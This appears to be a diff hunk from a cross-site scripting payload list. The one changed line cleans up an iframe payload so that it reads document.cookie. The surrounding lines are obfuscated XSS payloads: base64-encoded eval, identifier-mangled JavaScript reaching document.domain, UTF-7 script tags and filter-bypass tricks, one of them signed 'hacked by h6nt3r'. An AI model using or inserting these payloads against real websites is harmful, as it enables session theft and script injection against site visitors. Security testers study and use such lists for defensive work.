@@ -174,7 +174,7 @@ Testing%22+data-toggle%3Dcollapse+data-target%3D%3Cimg%26%23x20%3Bsrc%3Dx%26%23x
 xyz,test");alert(origin);//
 javascript:const originx="hacked by h6nt3r",var{a:onerror}={a:%2561lert};throw originx
 <address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
-<<iframe/onload​='this["src"]="javas&Tab;cript​:al"+"ert(document.cookie)"';>
+<<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert(document.cookie)"';>
 "><img/src=x onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(document.domain)')()"
 top[8680439..toString(30)](document.domain)
 +ADw-script+AD4-alert(1)+ADw-/script+AD4-
